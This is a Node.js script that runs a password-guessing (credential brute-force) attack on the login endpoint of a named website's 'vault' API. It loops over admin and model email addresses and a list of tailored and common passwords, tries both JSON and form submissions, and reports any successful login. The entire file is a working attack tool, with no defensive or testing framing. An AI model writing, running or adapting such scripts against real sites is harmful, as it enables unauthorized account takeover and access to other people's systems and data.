const https = require('https');

function tryLogin(body, isJson = true) {
  return new Promise((resolve) => {
    let postData = isJson ? JSON.stringify(body) : new URLSearchParams(body).toString();
    const req = https.request({
      hostname: 'api.bongbangla.top',
      path: '/vault-api/login.php',
      method: 'POST',
      headers: {
        'Content-Type': isJson ? 'application/json' : 'application/x-www-form-urlencoded',
        'Content-Length': Buffer.byteLength(postData),
        'Accept': 'application/json'
      }
    }, res => {
      let b = '';
      res.on('data', c => b += c);
      res.on('end', () => resolve({ status: res.statusCode, body: b }));
    });
    req.on('error', err => resolve({ error: err.message }));
    req.write(postData);
    req.end();
  });
}

async function run() {
  const passwords = [
    'Aktmtbar@1mzs',
    'Aktmtbar@1',
    'pass-Aktmtbar@1',
    'Aktmtbar@123',
    'Adminbong17',
    'bongbangla',
    '123456',
    '12345678'
  ];

  const emails = [
    'model@bongbangla.top',
    'admin@bongbangla.top'
  ];

  for (const email of emails) {
    for (const pass of passwords) {
      // test JSON
      const r = await tryLogin({ email, password: pass }, true);
      console.log(`JSON ${email} / ${pass} -> ${r.status}: ${r.body}`);
      if (r.status === 200) {
        console.log('SUCCESS FOUND!');
        return;
      }
      
      // test Form
      const r2 = await tryLogin({ email, password: pass }, false);
      if (r2.status === 200) {
        console.log(`FORM SUCCESS: ${email} / ${pass} -> ${r2.status}: ${r2.body}`);
        return;
      }
    }
  }
}

run();
